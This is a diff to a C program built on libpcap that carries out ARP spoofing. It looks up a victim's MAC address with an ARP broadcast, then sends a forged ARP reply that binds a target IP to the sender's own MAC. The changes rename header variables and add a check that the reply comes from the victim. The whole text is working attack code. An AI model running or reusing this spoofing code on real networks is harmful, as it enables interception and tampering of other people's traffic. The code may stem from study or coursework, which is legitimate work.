@@ -81,17 +81,17 @@ int main(int argc, char **argv)
 	memcpy(etherHeader->sourceHA, localMacAddress, 6);
 	etherHeader->type = ntohs(ETHERTYPE_ARP);
 
-	LPARP_HEADER ipHeader = (LPARP_HEADER)(packet + sizeof(ETHER_HEADER));
-	ipHeader->hardwareType = ntohs(1);
-	ipHeader->protocolType = ntohs(ETHERTYPE_IP);
-	ipHeader->hardwareAddressLength = 6;
-	ipHeader->protocolAddressLength = 4;
-	ipHeader->operationCode = ntohs(ARP_Request);
-	memcpy(ipHeader->senderHA, localMacAddress, 6);
-	memcpy(ipHeader->senderIP, &localIPAddress, 4);
-	memcpy(ipHeader->targetHA, "\x00\x00\x00\x00\x00\x00", 6);
+	LPARP_HEADER arpHeader = (LPARP_HEADER)(packet + sizeof(ETHER_HEADER));
+	arpHeader->hardwareType = ntohs(1);
+	arpHeader->protocolType = ntohs(ETHERTYPE_IP);
+	arpHeader->hardwareAddressLength = 6;
+	arpHeader->protocolAddressLength = 4;
+	arpHeader->operationCode = ntohs(ARP_Request);
+	memcpy(arpHeader->senderHA, localMacAddress, 6);
+	memcpy(arpHeader->senderIP, &localIPAddress, 4);
+	memcpy(arpHeader->targetHA, "\x00\x00\x00\x00\x00\x00", 6);
 	tempIP = inet_addr(sender_ip);
-	memcpy(ipHeader->targetIP, &tempIP, 4);
+	memcpy(arpHeader->targetIP, &tempIP, 4);
 
 	printf("[*] Send ARP broadcast for get victim's MAC Address...\n");
 	pcap_sendpacket(handle, packet, sizeof(ETHER_HEADER) + sizeof(ARP_HEADER));
@@ -105,32 +105,34 @@ int main(int argc, char **argv)
 		if (!captured_packet) // Null packet check
 			continue;
 
-		LPETHER_HEADER etherHeader = (LPETHER_HEADER)captured_packet;
-		if (ntohs(etherHeader->type) != ETHERTYPE_ARP)
+		LPETHER_HEADER capturedEtherHeader = (LPETHER_HEADER)captured_packet;
+		if (ntohs(capturedEtherHeader->type) != ETHERTYPE_ARP)
 			continue;
 
-		LPARP_HEADER ipHeader = (LPARP_HEADER)(captured_packet + sizeof(ETHER_HEADER));
-		if (ntohs(ipHeader->protocolType) == ETHERTYPE_IP && ntohs(ipHeader->operationCode) == ARP_Reply)
+		LPARP_HEADER capturedArpHeader = (LPARP_HEADER)(captured_packet + sizeof(ETHER_HEADER));
+		if (ntohs(capturedArpHeader->protocolType) == ETHERTYPE_IP &&
+			ntohs(capturedArpHeader->operationCode) == ARP_Reply &&
+			*(int *)capturedArpHeader->senderIP == *(int *)arpHeader->targetIP) // Check sender is equal to victim
 		{
 			printf("[*] Received ARP from %s\n", sender_ip);
 			printf("[*] %s Mac Address -> %02X:%02X:%02X:%02X:%02X:%02X\n", sender_ip,
-				ipHeader->senderHA[0], ipHeader->senderHA[1], ipHeader->senderHA[2],
-				ipHeader->senderHA[3], ipHeader->senderHA[4], ipHeader->senderHA[5]);
+				capturedArpHeader->senderHA[0], capturedArpHeader->senderHA[1], capturedArpHeader->senderHA[2],
+				capturedArpHeader->senderHA[3], capturedArpHeader->senderHA[4], capturedArpHeader->senderHA[5]);
 
-			memcpy(victimHA, ipHeader->senderHA, 6);
+			memcpy(victimHA, capturedArpHeader->senderHA, 6);
 			break;
 		}
 	}
 
 	// Start ARP Spoofing
 	memcpy(etherHeader->destHA, victimHA, 6);
-	ipHeader->operationCode = ntohs(ARP_Reply);
+	arpHeader->operationCode = ntohs(ARP_Reply);
 
 	tempIP = inet_addr(target_ip);
-	memcpy(ipHeader->senderIP, &tempIP, 4);
-	memcpy(ipHeader->targetHA, victimHA, 6);
+	memcpy(arpHeader->senderIP, &tempIP, 4);
+	memcpy(arpHeader->targetHA, victimHA, 6);
 	tempIP = inet_addr(sender_ip);
-	memcpy(ipHeader->targetIP, &tempIP, 4);
+	memcpy(arpHeader->targetIP, &tempIP, 4);
 
 	printf("[!] Start ARP spoofing !!\n");
 	pcap_sendpacket(handle, packet, sizeof(ETHER_HEADER) + sizeof(ARP_HEADER));
